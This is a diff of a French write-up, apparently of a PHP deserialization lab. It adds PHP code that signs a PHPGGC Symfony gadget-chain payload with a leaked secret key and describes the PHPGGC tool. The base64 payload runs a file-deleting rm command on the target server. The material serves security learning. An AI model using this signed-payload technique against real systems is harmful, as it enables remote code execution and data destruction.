@@ -22,13 +22,17 @@
 - Il me faut le SECRET_KEY pour créer mon gadget donc je cherche la keyword et je tombe sur ça.<br/><br/>
 <img src="https://media.discordapp.net/attachments/768928242467340328/770312787452493834/unknown.png?width=1095&height=630"/><br/><br/>
 - Maintenant je passe au développement du gadget chain.<br/>
+```PHP
+<?php 
 
+	$rce = "";
 
+	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
+	
+	echo $payload = urlencode('{"token":"' . $rce . '", "sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
 
-
-
-
-
+?>
+```
 <br/>
 - Pour créer l'object (RCE) qu'on voudra faire exécuter au serveur-web. Je fais l'usage de PHPGGC, mais qu'est-ce que c'est au juste ?<br/>
 - PHPGGC est une bibliothèque de payloads unserialize() et un outil qui les génère. Lorsqu'il y a une désérialisation sur un site Web dont vous n'avez pas le code, ou simplement lorsque vous essayez de créer un exploit, cet outil vous permet de générer la payload sans avoir à passer par les étapes fastidieuses de recherche de gadgets et de combinaison. Il peut être vu comme l'équivalent de ysoserial ou même frohoff, mais ce pour le langage PHP. Actuellement, l'outil prend en charge les frameworks: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii et ZendFramework.<br/>
@@ -43,16 +47,14 @@
 ```PHP
 <?php 
 
-	$rce = "
-Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBT
+	$rce = 'Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBT
 eW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7
 TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M
 6TI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnl
 cQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW
 50XENhYhlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcH
 RlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlc
-lxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
-";
+lxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==';
 
 	$secretKey = "7sbqv3xwfjipv4gmsofrqxlj4dcqr5dl";
 	
